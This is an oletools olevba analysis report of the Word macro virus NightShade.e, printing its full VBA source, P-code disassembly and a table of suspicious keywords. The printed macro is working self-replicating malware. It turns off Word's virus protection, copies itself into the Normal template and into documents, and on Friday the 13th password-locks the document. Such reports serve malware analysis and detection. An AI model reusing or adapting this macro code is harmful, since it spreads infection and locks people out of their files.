olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NightShade.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NightShade.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SPY.bas 
in file: Virus.MSWord.NightShade.e - OLE stream: 'Macros/VBA/SPY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Screen Protection Program\r\n"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.SPY.AutoClose"
On Error GoTo SPY
  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
  
  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False
  
  Set ADoc = ActiveDocument
  Set GDoc = NormalTemplate
  
  Dinstalled = False
  Ginstalled = False
  
  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(i).Name = "SPY" Then
      Dinstalled = True
      End If
  Next
  
  For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "SPY" Then
      Ginstalled = True
      End If
  Next
  
  If Dinstalled = False Then
  Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SPY", Object:=wdOrganizerObjectProjectItems
  ActiveDoc.SaveAs FileName:=ADoc.Name, FileFormat:=wdFormatTemplate
  End If
  
  If Ginstalled = False Then
  Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SPY", Object:=wdOrganizerObjectProjectItems
  Options.SaveNormalPrompt = False
  End If
  
  Randomize
  If WeekDay(Now()) = Int(Rnd() * 7 + 1) Then
If WeekDay(Now()) = 1 Or WeekDay(Now()) = 7 Then
  Assistant.Visible = True
  With Assistant.NewBalloon
  .Icon = msoIconAlert
  .Text = "µ¹§Ú©ñ°²,¨ä¾l§K½Í!"
  .Heading = "ÄY­«Äµ§i:"
  .Show
  End With
  
Else
   Set balloon1 = Assistant.NewBalloon
   balloon1.Heading = "¶Ù!²Ö¤F¶Ü?"
   Set balloon2 = Assistant.NewBalloon
   balloon2.Heading = "¨ÓªM¯ù,»´ÃP¤@¤U!"
      balloon1.Show
      balloon2.Show
  Assistant.Visible = False
  With Assistant.NewBalloon
  .Icon = msoIconTip
  .Text = "¸ê°T¦w¥þ,¤H¤H¦³³d"
  .Heading = "¨C¤éÄµ»y:"
  .Show
  End With
  
 End If
End If

If WeekDay(Now()) = 6 And Day(Now()) = 13 Then
  If ActiveDocument.HasPassword = False Then
     ActiveDocument.Password = "SPY"
   End If
End If

Application.DisplayAlerts = wdAlertsAll

SPY:
      

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.NightShade.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/SPY - 3812 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError SPY 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #3:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #4:
' Line #5:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' Line #8:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ADoc 
' Line #9:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GDoc 
' Line #10:
' Line #11:
' 	LitVarSpecial (False)
' 	St Dinstalled 
' Line #12:
' 	LitVarSpecial (False)
' 	St Ginstalled 
' Line #13:
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #15:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "SPY"
' 	Eq 
' 	IfBlock 
' Line #16:
' 	LitVarSpecial (True)
' 	St Dinstalled 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	StartForVariable 
' 	Next 
' Line #19:
' Line #20:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #21:
' 	Ld J 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "SPY"
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitVarSpecial (True)
' 	St Ginstalled 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Next 
' Line #25:
' Line #26:
' 	Ld Dinstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "SPY"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #28:
' 	Ld ADoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #29:
' 	EndIfBlock 
' Line #30:
' Line #31:
' 	Ld Ginstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "SPY"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #33:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #34:
' 	EndIfBlock 
' Line #35:
' Line #36:
' 	ArgsCall Read 0x0000 
' Line #37:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0007 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #39:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #40:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #41:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #42:
' 	LitStr 0x0012 "µ¹§Ú©ñ°²,¨ä¾l§K½Í!"
' 	MemStWith Then 
' Line #43:
' 	LitStr 0x0009 "ÄY­«Äµ§i:"
' 	MemStWith Heading 
' Line #44:
' 	ArgsMemCallWith Show 0x0000 
' Line #45:
' 	EndWith 
' Line #46:
' Line #47:
' 	ElseBlock 
' Line #48:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set balloon1 
' Line #49:
' 	LitStr 0x000A "¶Ù!²Ö¤F¶Ü?"
' 	Ld balloon1 
' 	MemSt Heading 
' Line #50:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set balloon2 
' Line #51:
' 	LitStr 0x0010 "¨ÓªM¯ù,»´ÃP¤@¤U!"
' 	Ld balloon2 
' 	MemSt Heading 
' Line #52:
' 	Ld balloon1 
' 	ArgsMemCall Show 0x0000 
' Line #53:
' 	Ld balloon2 
' 	ArgsMemCall Show 0x0000 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #55:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #56:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #57:
' 	LitStr 0x0011 "¸ê°T¦w¥þ,¤H¤H¦³³d"
' 	MemStWith Then 
' Line #58:
' 	LitStr 0x0009 "¨C¤éÄµ»y:"
' 	MemStWith Heading 
' Line #59:
' 	ArgsMemCallWith Show 0x0000 
' Line #60:
' 	EndWith 
' Line #61:
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndIfBlock 
' Line #64:
' Line #65:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #66:
' 	Ld ActiveDocument 
' 	MemLd HasPassword 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #67:
' 	LitStr 0x0003 "SPY"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	EndIfBlock 
' Line #70:
' Line #71:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #72:
' Line #73:
' 	Label SPY 
' Line #74:
' Line #75:
' Line #76:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

